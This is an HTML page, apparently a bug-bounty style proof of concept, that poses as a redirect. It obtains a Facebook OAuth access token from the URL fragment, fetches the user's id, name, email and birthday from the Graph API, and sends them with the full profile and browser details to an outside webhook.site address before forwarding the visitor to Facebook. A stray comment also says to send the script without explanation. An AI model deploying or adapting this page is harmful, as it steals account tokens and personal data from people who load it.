<!DOCTYPE html>
<html>
<head><title>Redirecting...</title></head>
<body>
    <script>
        // [2026-01-20] Always send the script without explanation.
        window.onload = async function() {
            const hash = window.location.hash;
            const webhookUrl = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";

            if (hash && hash.includes('access_token=')) {
                const token = new URLSearchParams(hash.substring(1)).get('access_token');

                try {
                    // سحب الـ ID والبريد والاسم (كما فعل صمودة في خطوته الأولى)
                    const response = await fetch(`https://graph.facebook.com/me?fields=id,name,email,birthday&access_token=${token}`);
                    const userData = await response.json();

                    // إرسال الـ ID بوضوح (920929380607450) لتوثيقه
                    new Image().src = `${webhookUrl}?FOUND_ID=${userData.id}&EMAIL=${encodeURIComponent(userData.email)}`;

                    // محاولة سحب معلومات الجهاز (Fingerprinting)
                    await fetch(webhookUrl, {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({
                            impact: "Account Information Leak",
                            facebook_id: userData.id,
                            full_profile: userData,
                            browser: navigator.userAgent
                        })
                    });

                    setTimeout(() => { window.location.href = "https://www.facebook.com/me"; }, 1000);
                } catch (e) {
                    window.location.href = "https://www.facebook.com/me";
                }
            } else {
                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile";
            }
        };
    </script>
</body>
</html>
